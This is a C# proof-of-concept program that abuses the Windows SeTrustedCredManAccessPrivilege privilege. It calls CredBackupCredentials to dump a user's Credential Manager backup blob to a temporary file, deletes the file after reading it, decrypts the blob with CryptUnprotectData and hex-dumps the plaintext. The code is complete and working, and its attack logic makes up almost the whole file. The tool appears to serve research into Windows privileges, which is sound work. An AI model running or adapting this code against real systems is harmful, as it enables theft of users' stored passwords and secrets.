using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Runtime.InteropServices;

namespace SeTrustedCredManAccessPrivilegePoC
{
    class SeTrustedCredManAccessPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum CryptProtectFlags
        {
            CRYPTPROTECT_NO_OPTION = 0x0,
            CRYPTPROTECT_UI_FORBIDDEN = 0x1,
            CRYPTPROTECT_LOCAL_MACHINE = 0x4,
            CRYPTPROTECT_CRED_SYNC = 0x8,
            CRYPTPROTECT_AUDIT = 0x10,
            CRYPTPROTECT_NO_RECOVERY = 0x20,
            CRYPTPROTECT_VERIFY_PROTECTION = 0x40
        }

        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        /*
         * P/Invoke : Structs
         */
        [StructLayout(LayoutKind.Sequential)]
        public struct CRYPT_INTEGER_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredBackupCredentials(
            IntPtr Token,
            string Path,
            IntPtr Password,
            int PasswordSize,
            int Flags);

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CryptUnprotectData(
            in CRYPT_INTEGER_BLOB pDataIn,
            StringBuilder ppszDataDescr,
            IntPtr /* in CRYPT_INTEGER_BLOB */ pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr /* in CRYPTPROTECT_PROMPTSTRUCT */ pPromptStruct,
            CryptProtectFlags dwFlags,
            out CRYPT_INTEGER_BLOB pDataOut);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        /*
         * User defined functions
         */
        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static bool DumpDPAPICredentials(
            IntPtr hToken,
            out uint nBlobSize,
            out IntPtr pBlobData)
        {
            int error;
            nBlobSize = 0;
            pBlobData = IntPtr.Zero;
            string filePath = string.Format("{0}\\tmp_dpapi_blob.bin", Environment.CurrentDirectory);

            Console.WriteLine("[>] Trying to get an encrypted backup DPAPI blob.");

            if (File.Exists(filePath))
            {
                Console.WriteLine("[!] \"{0}\" is already exists.");

                return false;
            }

            bool status = CredBackupCredentials(
                hToken,
                filePath,
                IntPtr.Zero,
                0,
                0);

            if (!status)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get an encrypted backup DPAPI blob.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got an encrypted backup DPAPI blob.");
                Console.WriteLine("    |-> File Path : {0}", filePath);
            }

            byte[] data;

            try
            {
                Console.WriteLine("[>] Reading the encrypted backup DPAPI blob.");
                data = File.ReadAllBytes(filePath);

                Console.WriteLine("[>] Deleting the encrypted backup DPAPI blob.");
                File.Delete(filePath);
            }
            catch
            {
                Console.WriteLine("[!] Raise exception in file operation.");

                return false;
            }

            var ppszDataDescr = new StringBuilder();
            var dataIn = new CRYPT_INTEGER_BLOB { cbData = (uint)data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
            Marshal.Copy(data, 0, dataIn.pbData, data.Length);

            Console.WriteLine("[>] Trying to decrypt the DPAPI blob.");

            status = CryptUnprotectData(
                in dataIn,
                ppszDataDescr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                CryptProtectFlags.CRYPTPROTECT_NO_OPTION,
                out CRYPT_INTEGER_BLOB dataOut);
            Marshal.FreeHGlobal(dataIn.pbData);

            if (!status)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to decrypt the DPAPI blob.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                Console.WriteLine("[+] DPAPI blob is decrypted successfully.");
            }

            nBlobSize = dataOut.cbData;
            pBlobData = dataOut.pbData;

            return true;
        }


        static void Main()
        {
            IntPtr hToken = WindowsIdentity.GetCurrent().Token;

            Console.WriteLine("[*] If you have SeTrustedCredmanAccessPrivilege, you can access any DPAPI data in the system.");
            Console.WriteLine("[*] This PoC tries to get a decrypted DPAPI blob for current user.");
            Console.WriteLine("[*] Current User : {0}\\{1}", Environment.UserDomainName, Environment.UserName);

            if (DumpDPAPICredentials(
                hToken,
                out uint nBlobSize,
                out IntPtr pBlobData))
            {
                Console.WriteLine("[*] Decrypted Data:\n");
                HexDump.Dump(pBlobData, (int)nBlobSize, 1);
                LocalFree(pBlobData);
            }
        }
    }
}
